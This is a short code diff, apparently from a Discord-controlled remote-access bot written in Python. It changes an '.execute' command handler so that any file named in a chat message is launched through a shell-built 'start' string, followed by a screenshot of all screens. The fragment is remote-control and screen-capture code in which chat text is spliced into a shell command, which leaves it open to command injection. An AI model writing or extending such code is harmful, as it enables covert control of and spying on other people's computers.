@@ -53,10 +53,7 @@ elif message.content[:8] == '.execute':
                 try:
                     #.log Trying to execute the file 
                     file_extension = os.path.splitext(message.content[9:])[1]
-                    if file_extension.lower() == '.exe':
-                        subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
-                    else:
-                        subprocess.run('"' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
+                    subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                     #.log Executed the files 
                     await asyncio.sleep(1)
                     ImageGrab.grab(all_screens=True).save('ss.png')
